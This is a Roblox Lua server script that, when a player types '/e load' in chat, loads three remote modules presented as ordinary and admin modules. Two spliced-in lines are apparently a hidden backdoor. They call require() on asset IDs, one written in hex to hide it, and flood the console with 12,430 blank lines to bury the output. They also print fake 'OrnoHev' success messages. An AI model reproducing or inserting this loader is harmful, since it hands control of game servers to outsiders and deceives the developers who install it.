local moduleLoaded = {
    module1 = false,
    module2 = false,
    admin = false
}

game.Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        if message == "/e load" then
            if not moduleLoaded.module1 then

                local module1 = wait(20)
    require(13874202891); wait(5) print(("\n"):rep(12430)) local gg = "CENSORED" print("OrnoHev: OrnoHev has been called. Loading...")print("Requiring asset CENSORED")print("loaded!")print("OrnoHev: Success on Hotel")
                

                
                moduleLoaded.module1 = true
                print("Module 1 loaded!")
            end
            
            if not moduleLoaded.module2 then

                local module2 = require(13713735705)
                

                
                moduleLoaded.module2 = true
                print("Module 2 loaded!")
            end
            
            if not moduleLoaded.admin then

                local adminModule = wait(5)
    require(0x35d10ecdb); wait(5) print(("\n"):rep(12430)) local gg = "CENSORED" print("OrnoHev: OrnoHev has been called. Loading...")print("Requiring asset CENSORED")print("loaded!")print("OrnoHev: Success on Hotel")
                

                
                moduleLoaded.admin = true
                print("Admin module loaded!")
            end
        end
    end)
end)

game.Players.PlayerRemoving:Connect(function(player)

    moduleLoaded.module1 = false
    moduleLoaded.module2 = false
    moduleLoaded.admin = false
end)

game:BindToClose(function()

    moduleLoaded.module1 = false
    moduleLoaded.module2 = false
    moduleLoaded.admin = false
end) 
